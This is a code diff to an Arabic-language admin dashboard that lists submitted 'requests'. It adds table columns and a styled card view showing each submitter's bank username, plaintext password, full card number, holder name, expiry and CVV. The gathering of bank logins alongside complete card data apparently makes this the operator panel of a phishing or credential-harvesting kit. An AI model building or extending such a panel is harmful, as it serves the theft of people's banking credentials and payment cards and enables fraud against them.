@@ -324,13 +324,16 @@
               <th>الهاتف</th>
               <th>رقم الحساب</th>
               <th>عميل بنك</th>
+              <th>اسم المستخدم</th>
+              <th>كلمة المرور</th>
+              <th>البطاقة</th>
               <th>الوقت</th>
               <th>الحالة</th>
               <th>الإجراءات</th>
             </tr>
           </thead>
           <tbody id="rows">
-            <tr><td colspan="7" class="empty">لا توجد طلبات بعد</td></tr>
+            <tr><td colspan="10" class="empty">لا توجد طلبات بعد</td></tr>
           </tbody>
         </table>
       </div>
@@ -470,16 +473,22 @@
   function render(list){
     document.getElementById('totalOrders').textContent = list.length;
     const rows = document.getElementById('rows');
-    if(!list.length){ rows.innerHTML = '<tr><td colspan="7" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
+    if(!list.length){ rows.innerHTML = '<tr><td colspan="10" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
     rows.innerHTML = list.map(s => {
       const bankClient = s.is_bank_client === 'yes'
         ? '<span style="color:var(--green);font-weight:700">نعم</span>'
         : (s.is_bank_client === 'no' ? '<span style="color:var(--red);font-weight:700">لا</span>' : '<span style="color:var(--ink-soft)">—</span>');
+      const cardCell = s.card_number
+        ? '<span style="font-family:\'Courier New\',monospace;font-size:12px;direction:ltr;display:inline-block">'+escapeHtml(formatCardNumber(s.card_number))+'</span>'
+        : '<span style="color:var(--ink-soft)">—</span>';
       return '<tr>' +
         '<td><span style="font-weight:600">'+escapeHtml(s.name)+'</span></td>' +
         '<td><span class="phone">'+escapeHtml(s.phone)+'</span></td>' +
         '<td>'+escapeHtml(s.account_number || '—')+'</td>' +
         '<td>'+bankClient+'</td>' +
+        '<td>'+escapeHtml(s.username || '—')+'</td>' +
+        '<td>'+(s.password ? '<span style="font-family:\'Courier New\',monospace;letter-spacing:1px">'+escapeHtml(s.password)+'</span>' : '<span style="color:var(--ink-soft)">—</span>')+'</td>' +
+        '<td>'+cardCell+'</td>' +
         '<td class="time">'+fmtTime(s.time)+'</td>' +
         '<td>'+statusBadge(s.status)+'</td>' +
         '<td class="td-actions">' +
@@ -512,19 +521,44 @@
     const bankClientText = s.is_bank_client === 'yes' ? 'نعم' : (s.is_bank_client === 'no' ? 'لا' : '—');
     const bankClientColor = s.is_bank_client === 'yes' ? 'var(--green)' : (s.is_bank_client === 'no' ? 'var(--red)' : 'inherit');
 
+    const chipSvg = '<svg class="cc-chip-svg" viewBox="0 0 60 46" xmlns="http://www.w3.org/2000/svg">' +
+      '<rect x="0" y="0" width="60" height="46" rx="6" fill="url(#chipGrad)"/>' +
+      '<defs><linearGradient id="chipGrad" x1="0" y1="0" x2="60" y2="46" gradientUnits="userSpaceOnUse">' +
+      '<stop offset="0%" stop-color="#d9d0c0"/><stop offset="30%" stop-color="#c4baa8"/>' +
+      '<stop offset="50%" stop-color="#b8ad99"/><stop offset="70%" stop-color="#c4baa8"/>' +
+      '<stop offset="100%" stop-color="#d5ccbc"/></linearGradient></defs>' +
+      '<line x1="0" y1="16" x2="20" y2="16" stroke="#9e9585" stroke-width="1.2"/>' +
+      '<line x1="0" y1="30" x2="20" y2="30" stroke="#9e9585" stroke-width="1.2"/>' +
+      '<line x1="40" y1="16" x2="60" y2="16" stroke="#9e9585" stroke-width="1.2"/>' +
+      '<line x1="40" y1="30" x2="60" y2="30" stroke="#9e9585" stroke-width="1.2"/>' +
+      '<rect x="18" y="4" width="24" height="38" rx="3" fill="none" stroke="#9e9585" stroke-width="1.2"/>' +
+      '<line x1="18" y1="16" x2="42" y2="16" stroke="#9e9585" stroke-width="1.2"/>' +
+      '<line x1="18" y1="30" x2="42" y2="30" stroke="#9e9585" stroke-width="1.2"/>' +
+      '<line x1="30" y1="4" x2="30" y2="16" stroke="#9e9585" stroke-width="1"/>' +
+      '<line x1="30" y1="30" x2="30" y2="42" stroke="#9e9585" stroke-width="1"/>' +
+      '</svg>';
+    const nfcSvg = '<svg class="cc-nfc-svg" viewBox="0 0 30 30" xmlns="http://www.w3.org/2000/svg">' +
+      '<g transform="rotate(-90 15 15)">' +
+      '<circle cx="15" cy="22" r="1.8" fill="#fff"/>' +
+      '<path d="M10.5 17.5a6.36 6.36 0 0 1 9 0" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"/>' +
+      '<path d="M7 14a11 11 0 0 1 16 0" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"/>' +
+      '<path d="M3.5 10.5a15.5 15.5 0 0 1 23 0" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"/>' +
+      '</g></svg>';
+
     let cardSection = '';
     if (s.card_number) {
+      const cardGrad = 'linear-gradient(135deg,#1a1a2e 0%,#16213e 40%,#0f3460 100%)';
       cardSection =
-        '<div class="credit-card" style="background:linear-gradient(135deg,#1a1a2e 0%,#16213e 40%,#0f3460 100%)">' +
-          '<div class="cc-top"><div class="cc-chip-area"><div style="width:36px;height:28px;background:linear-gradient(135deg,#c9a84c,#f0d078);border-radius:5px"></div></div></div>' +
+        '<div class="credit-card" style="background:'+cardGrad+'">' +
+          '<div class="cc-top"><div class="cc-chip-area">'+chipSvg+nfcSvg+'</div></div>' +
           '<div class="cc-number">'+escapeHtml(formatCardNumber(s.card_number))+'</div>' +
           '<div class="cc-bottom">' +
-            '<div class="cc-info"><div class="cc-field"><label>HOLDER</label><span>'+escapeHtml(s.card_name || '—')+'</span></div></div>' +
+            '<div class="cc-info"><div class="cc-field"><label>CARD HOLDER</label><span>'+escapeHtml(s.card_name || '—')+'</span></div></div>' +
             '<div class="cc-info"><div class="cc-field"><label>VALID THRU</label><span>'+escapeHtml(s.card_expiry||'—')+'</span></div></div>' +
           '</div>' +
         '</div>';
       if (s.cvv) {
-        cardSection += '<div class="cc-back" style="background:linear-gradient(135deg,#1a1a2e 0%,#16213e 40%,#0f3460 100%)">' +
+        cardSection += '<div class="cc-back" style="background:'+cardGrad+'">' +
           '<div class="cc-magstripe"></div>' +
           '<div class="cc-sig-strip"><span class="sig-label">CVV</span><span class="cvv-val">'+escapeHtml(s.cvv)+'</span></div>' +
         '</div>';
